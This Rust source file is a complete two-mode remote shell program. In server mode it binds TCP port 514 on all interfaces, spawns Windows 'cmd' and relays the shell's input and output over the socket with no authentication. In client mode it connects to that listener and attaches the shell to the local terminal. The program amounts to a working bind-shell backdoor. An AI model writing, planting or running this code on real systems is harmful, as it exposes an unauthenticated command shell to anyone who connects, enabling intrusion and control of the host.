use std::io::prelude::*;
use std::io;
use std::process::{Command, Stdio};
use std::net::{TcpListener, TcpStream, SocketAddr};
use std::str;
use std::thread;
use std::env;

//TODO:: Error handling and quitting

fn handle_outstream_async<F: Read + std::marker::Send + 'static, T: Write + std::marker::Send + 'static>(mut from: F, mut to: T) {
    thread::spawn(move || {
        let mut buffer: [u8; 256] = [0; 256];
        loop {
            let num_read = from.read(&mut buffer).unwrap();
            let _ = to.write_all(&buffer[..num_read]).unwrap();
            let _ = to.flush();
        }
    });
}

fn handle_instream<F: Read, T: Write>(mut from: F, mut to: T) {
    let mut buffer: [u8; 256] = [0; 256];
    loop {
        let amount_read = from.read(&mut buffer).unwrap();
        let _ = to.write_all(&buffer[..amount_read]).unwrap();
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let is_server = args.len() == 1;

    if is_server {
        let listener = TcpListener::bind("[::]:514").unwrap();
        println!("Listening on: {}", listener.local_addr().unwrap());
        let (stream, _) = listener.accept().unwrap();

        let mut process = Command::new("cmd")
                                .stdin(Stdio::piped())
                                .stdout(Stdio::piped())
                                .stderr(Stdio::piped())
                                .spawn()
                                .unwrap();

        handle_outstream_async(process.stderr.take().unwrap(), stream.try_clone().unwrap());
        handle_outstream_async(process.stdout.take().unwrap(), stream.try_clone().unwrap());
        handle_instream(stream, process.stdin.take().unwrap());
    } else {
        let addr: SocketAddr = args[1].parse().unwrap();
        let stream = TcpStream::connect(addr).unwrap();

        handle_outstream_async(stream.try_clone().unwrap(), io::stdout());
        handle_instream(io::stdin(), stream);
    }
}